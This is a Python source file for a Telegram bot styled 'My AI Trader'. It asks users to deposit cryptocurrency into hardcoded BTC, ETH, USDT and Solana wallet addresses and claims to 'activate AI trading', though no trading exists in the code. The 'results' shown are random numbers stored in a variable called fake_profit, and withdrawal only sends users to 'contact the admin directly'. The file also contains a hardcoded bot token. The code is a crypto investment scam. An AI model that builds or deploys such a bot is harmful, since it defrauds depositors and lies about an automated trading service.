
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import random

BOT_TOKEN = "7937003178:AAFfu1-Wm4nbEg7MFRwPaIUHBET_xGwu6BQ"

WALLETS = {'BTC': 'bc1qfk87h93nd77cm3cug3l8qz97w5nm88esgv9svh', 'ETH': '0x9BbCf0728B22dC3270A9c21344f94bE4BDb3d271', 'USDT (ERC20)': '0x9BbCf0728B22dC3270A9c21344f94bE4BDb3d271', 'SOLANA': '45RV4PL9c83VKZkSuBwU9Pp5nETwN3bWmu2Gk5KDrsCS'}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Welcome to *My AI Trader!*\n\n"
        "Deposit crypto and activate AI trading instantly.\n"
        "Use /deposit to begin.\n\n"
        "Commands:\n"
        "/deposit - Send funds\n"
        "/activate_ai - Start trading\n"
        "/results - See trading results\n"
        "/withdraw - Request payout\n"
        "/support - Contact help",
        parse_mode='Markdown'
    )

async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("BTC", callback_data='wallet_BTC')],
        [InlineKeyboardButton("ETH", callback_data='wallet_ETH')],
        [InlineKeyboardButton("USDT (ERC20)", callback_data='wallet_USDT (ERC20)')],
        [InlineKeyboardButton("SOLANA", callback_data='wallet_SOLANA')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("💸 Choose a cryptocurrency to deposit:", reply_markup=reply_markup)

async def wallet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    coin = query.data.replace('wallet_', '')
    wallet_address = WALLETS.get(coin, "Unknown")
    await query.edit_message_text(
        f"✅ Send *{coin}* to the address below:\n`{wallet_address}`\n\n"
        "Once sent, use /activate_ai to begin trading.",
        parse_mode='Markdown'
    )

async def activate_ai(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 AI Trading activated! Simulated trading in progress. Use /results anytime.")

async def results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fake_profit = round(random.uniform(-5, 18), 2)
    await update.message.reply_text(
        f"📊 Simulated 24h Performance:\nProfit: *{fake_profit}%*\n(This is a simulation)",
        parse_mode='Markdown'
    )

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💼 To withdraw, contact the admin directly.")

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📩 Need help?")

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("deposit", deposit))
app.add_handler(CallbackQueryHandler(wallet_callback))
app.add_handler(CommandHandler("activate_ai", activate_ai))
app.add_handler(CommandHandler("results", results))
app.add_handler(CommandHandler("withdraw", withdraw))
app.add_handler(CommandHandler("support", support))
app.run_polling()
